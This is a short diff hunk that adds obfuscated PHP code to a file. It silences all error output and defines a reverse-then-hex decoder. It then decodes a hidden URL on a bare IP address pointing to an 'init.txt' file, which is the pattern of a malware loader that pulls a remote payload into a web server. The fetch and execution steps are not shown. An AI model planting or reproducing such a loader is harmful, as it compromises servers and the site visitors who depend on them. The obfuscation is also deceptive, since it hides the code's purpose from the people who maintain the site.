@@ -1,3 +1,4 @@
+<?php
 @error_reporting(0); @ini_set('display_errors', 0);
 $d = function($s) { return hex2bin(strrev($s)); };
 $t = $d('478747e24796e696f23323f5930323135323a6f2330323e2136313e2739313e29363f2f2a307474786');
